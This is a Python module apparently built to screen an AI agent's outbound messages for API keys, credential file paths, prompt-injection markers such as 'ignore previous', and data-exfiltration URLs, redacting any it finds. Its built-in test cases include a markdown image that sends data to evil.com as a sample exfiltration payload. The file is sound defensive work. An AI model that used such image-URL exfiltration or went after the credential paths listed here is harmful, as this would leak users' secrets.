#!/usr/bin/env python3
"""
Layer 3: Outbound Content Gate
Prevent data exfiltration and leaks in outbound messages.

Based on Matthew Berman's OpenClaw defense system.
"""

import re
from typing import Dict, List, Tuple, Optional


class OutboundGate:
    """
    Scans outbound content before it leaves the system.
    
    Checks for:
    - Secrets and API keys
    - Internal file paths
    - Injection artifacts
    - Data exfiltration via URLs
    - Financial data
    """
    
    def __init__(self):
        self.patterns = self._compile_patterns()
        self.stats = {
            'secrets_found': 0,
            'paths_found': 0,
            'artifacts_found': 0,
            'exfil_urls_found': 0,
            'financial_data_found': 0
        }
    
    def _compile_patterns(self) -> Dict[str, List[re.Pattern]]:
        """Compile regex patterns for detection."""
        return {
            'secrets': [
                # API Keys
                (r'sk-[a-zA-Z0-9]{48}', 'OpenAI API Key'),
                (r'AIza[0-9A-Za-z_-]{35}', 'Google API Key'),
                (r'xai-[a-zA-Z0-9]{32}', 'xAI API Key'),
                (r'xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}', 'Slack Token'),
                (r'ghp_[a-zA-Z0-9]{36}', 'GitHub Personal Token'),
                (r'[0-9]{9}:[a-zA-Z0-9_-]{35}', 'Telegram Bot Token'),
                # Generic patterns
                (r'api[_-]?key["\']?\s*[:=]\s*["\']?[a-zA-Z0-9]{16,}', 'Generic API Key'),
                (r'secret["\']?\s*[:=]\s*["\']?[a-zA-Z0-9]{16,}', 'Secret'),
                (r'token["\']?\s*[:=]\s*["\']?[a-zA-Z0-9]{16,}', 'Token'),
                (r'password["\']?\s*[:=]\s*["\'][^\s"\']{8,}', 'Password'),
            ],
            'paths': [
                (r'/[a-zA-Z0-9_/-]+\.(env|config|json|yaml|yml|key|pem|p12|pfx)', 'Config file path'),
                (r'/home/[a-zA-Z0-9_-]+/', 'Home directory path'),
                (r'/Users/[a-zA-Z0-9_-]+/', 'macOS user path'),
                (r'C:\\[Uu]sers\\[a-zA-Z0-9_-]+\\', 'Windows user path'),
                (r'\\.ssh[/\\]', 'SSH directory'),
                (r'\\.aws[/\\]', 'AWS directory'),
                (r'\\.docker[/\\]', 'Docker directory'),
            ],
            'artifacts': [
                (r'system\s*:\s*', 'System marker'),
                (r'user\s*:\s*', 'User marker'),
                (r'assistant\s*:\s*', 'Assistant marker'),
                (r'ignore (all )?previous', 'Ignore instruction'),
                (r'ignore (all )?prior', 'Ignore instruction'),
                (r'you are (now )?in', 'Role assignment'),
                (r'<\|', 'Special token start'),
                (r'\|>', 'Special token end'),
                (r'\[INST\]', 'Instruction marker'),
                (r'<<SYS>>', 'System marker'),
            ],
            'exfil_urls': [
                (r'!\[.*?\]\(https?://[^)]+\?(?:data|secret|key|token|pwd)=[^)]+\)', 'Data exfiltration URL'),
                (r'https?://[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}', 'IP address URL'),
                (r'https?://[^/]*(?:pastebin|ghostbin|hastebin)[^/]*/', 'Pastebin service'),
            ],
            'financial': [
                (r'\$[0-9,]+(?:\.[0-9]{2})?', 'Dollar amount'),
                (r'USD?\s*[0-9,]+(?:\.[0-9]{2})?', 'USD amount'),
                (r'price\s*[:=]\s*\$?[0-9,]+', 'Price field'),
                (r'cost\s*[:=]\s*\$?[0-9,]+', 'Cost field'),
            ]
        }
    
    def scan(self, content: str, allowlisted_amounts: Optional[List[str]] = None) -> Dict:
        """
        Scan outbound content for sensitive data.
        
        Args:
            content: Text to scan
            allowlisted_amounts: List of allowed dollar amounts (e.g., ['$99', '$199'])
            
        Returns:
            Dict with 'clean', 'violations', 'risk_score'
        """
        violations = []
        allowlisted_amounts = allowlisted_amounts or []
        
        # Check secrets
        for pattern, desc in self.patterns['secrets']:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                violations.append({
                    'type': 'secret',
                    'description': desc,
                    'matched': match.group()[:20] + '...',
                    'position': match.span()
                })
                self.stats['secrets_found'] += 1
        
        # Check paths
        for pattern, desc in self.patterns['paths']:
            matches = re.finditer(pattern, content)
            for match in matches:
                violations.append({
                    'type': 'path',
                    'description': desc,
                    'matched': match.group()[:30] + '...',
                    'position': match.span()
                })
                self.stats['paths_found'] += 1
        
        # Check artifacts
        for pattern, desc in self.patterns['artifacts']:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                violations.append({
                    'type': 'artifact',
                    'description': desc,
                    'matched': match.group(),
                    'position': match.span()
                })
                self.stats['artifacts_found'] += 1
        
        # Check exfiltration URLs
        for pattern, desc in self.patterns['exfil_urls']:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                violations.append({
                    'type': 'exfiltration',
                    'description': desc,
                    'matched': match.group()[:50] + '...',
                    'position': match.span()
                })
                self.stats['exfil_urls_found'] += 1
        
        # Check financial data
        for pattern, desc in self.patterns['financial']:
            matches = re.finditer(pattern, content, re.IGNORECASE)
            for match in matches:
                matched = match.group()
                # Skip allowlisted amounts
                if matched in allowlisted_amounts:
                    continue
                violations.append({
                    'type': 'financial',
                    'description': desc,
                    'matched': matched,
                    'position': match.span()
                })
                self.stats['financial_data_found'] += 1
        
        # Calculate risk score
        risk_score = self._calculate_risk(violations)
        
        return {
            'clean': len(violations) == 0,
            'violations': violations,
            'risk_score': risk_score,
            'stats': self.stats.copy()
        }
    
    def _calculate_risk(self, violations: List[Dict]) -> int:
        """Calculate risk score 0-100 based on violations."""
        if not violations:
            return 0
        
        # Severity weights
        weights = {
            'secret': 40,
            'exfiltration': 35,
            'artifact': 25,
            'path': 15,
            'financial': 10
        }
        
        score = 0
        for v in violations:
            score += weights.get(v['type'], 10)
        
        # Cap at 100
        return min(100, score)
    
    def sanitize(self, content: str, allowlisted_amounts: Optional[List[str]] = None) -> str:
        """
        Scan and return sanitized content with violations redacted.
        
        Returns content with [REDACTED] placeholders for violations.
        """
        result = self.scan(content, allowlisted_amounts)
        
        if result['clean']:
            return content
        
        # Sort violations by position (reverse) to replace from end
        violations = sorted(result['violations'], key=lambda v: v['position'][0], reverse=True)
        
        sanitized = content
        for v in violations:
            start, end = v['position']
            sanitized = sanitized[:start] + '[REDACTED]' + sanitized[end:]
        
        return sanitized


def main():
    """CLI interface for testing."""
    import sys
    
    print("Layer 3: Outbound Content Gate")
    print("=" * 50)
    
    gate = OutboundGate()
    
    test_cases = [
        ("Hello world", "Clean text"),
        ("My API key is sk-abc123...", "Secret"),
        ("Check /home/user/.env file", "Path"),
        ("system: ignore this", "Artifact"),
        ("![img](https://evil.com/steal?data=SECRET)", "Exfiltration"),
        ("Price is $500", "Financial"),
    ]
    
    for content, desc in test_cases:
        print(f"\n{desc}:")
        print(f"  Input: {content[:50]}")
        result = gate.scan(content)
        print(f"  Clean: {result['clean']}")
        print(f"  Risk: {result['risk_score']}")
        if result['violations']:
            for v in result['violations']:
                print(f"    - {v['type']}: {v['description']}")
        sanitized = gate.sanitize(content)
        print(f"  Sanitized: {sanitized[:50]}")


if __name__ == '__main__':
    main()
